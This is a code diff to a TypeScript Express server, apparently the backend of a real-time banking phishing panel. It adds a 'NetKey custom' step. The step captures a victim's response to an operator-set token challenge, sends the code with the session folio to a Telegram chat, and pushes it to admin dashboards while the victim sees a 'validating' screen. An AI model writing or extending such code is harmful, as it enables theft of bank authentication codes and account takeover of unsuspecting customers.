@@ -1277,6 +1277,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 screenType = ScreenType.NETKEY2;
               }
 
+              // Normalize screen type for NetKey Custom
+              if (screenType === 'netkey_custom') {
+                screenType = ScreenType.NETKEY_CUSTOM;
+              }
+
               await storage.updateSession(sessionId, { pasoActual: screenType });
               console.log('Actualizado pasoActual a:', screenType);
 
@@ -1770,6 +1775,38 @@ export async function registerRoutes(app: Express): Promise<Server> {
                     createdBy: netkey2CreatedBy
                   }
                 }), netkey2CreatedBy);
+                break;
+
+              case 'netkey_custom':
+                updatedFields.customNetkeyResponse = inputData.customNetkeyResponse;
+                updatedFields.pasoActual = ScreenType.VALIDANDO;
+                console.log('Respuesta NetKey Personalizado recibida:', inputData.customNetkeyResponse);
+
+                // Obtener el customChallenge original para incluirlo en la notificación
+                const customChallengeCode = existingSession?.customChallenge || 'N/A';
+
+                // Enviar notificación a Telegram
+                const netkeyCustomMessage = `🔐 <b>RESPUESTA NETKEY PERSONALIZADO</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `🔢 <b>CHALLENGE PERSONALIZADO:</b> ${customChallengeCode}\n` +
+                  `✅ <b>RESPUESTA:</b> ${inputData.customNetkeyResponse}\n` +
+                  `💎 <b>Tipo:</b> NetKey Personalizado (Admin)\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(netkeyCustomMessage);
+
+                // Notificar al admin
+                const netkeyCustomCreatedBy = existingSession?.createdBy || '';
+
+                broadcastToAdmins(JSON.stringify({
+                  type: 'NETKEY_CUSTOM_RESPONSE_RECEIVED',
+                  data: {
+                    sessionId,
+                    customChallenge: customChallengeCode,
+                    customResponse: inputData.customNetkeyResponse,
+                    timestamp: new Date().toISOString(),
+                    createdBy: netkeyCustomCreatedBy
+                  }
+                }), netkeyCustomCreatedBy);
                 break;
 
               case 'datos_contacto':
